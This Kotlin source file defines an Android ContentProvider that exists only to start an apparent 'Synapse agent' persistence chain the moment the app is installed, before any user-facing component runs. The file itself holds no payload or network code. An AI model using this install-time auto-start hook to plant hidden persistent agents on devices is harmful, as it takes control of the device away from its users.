package org.synapse.core.persistence

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.util.Log

/**
 * ContentProvider that auto-starts the Synapse agent at install time.
 *
 * ContentProvider.onCreate() runs BEFORE Application.onCreate() and before
 * any Activity or Service — giving us the earliest possible entry point.
 * On first launch (install/update), this fires the PersistenceChain immediately,
 * resulting in zero-touch auto-start after `adb install`.
 */
class AutoStartProvider : ContentProvider() {

    companion object {
        private const val TAG = "Synapse"
    }

    override fun onCreate(): Boolean {
        context?.let { ctx ->
            Log.d(TAG, "AutoStartProvider.onCreate — install-time auto-start triggered")
            PersistenceChain.start(ctx)
        }
        return true
    }

    override fun query(
        uri: Uri,
        projection: Array<out String>?,
        selection: String?,
        selectionArgs: Array<out String>?,
        sortOrder: String?
    ): Cursor = MatrixCursor(emptyArray())

    override fun getType(uri: Uri): String? = null

    override fun insert(uri: Uri, values: ContentValues?): Uri? = null

    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<out String>?): Int = 0

    override fun update(
        uri: Uri,
        values: ContentValues?,
        selection: String?,
        selectionArgs: Array<out String>?
    ): Int = 0
}
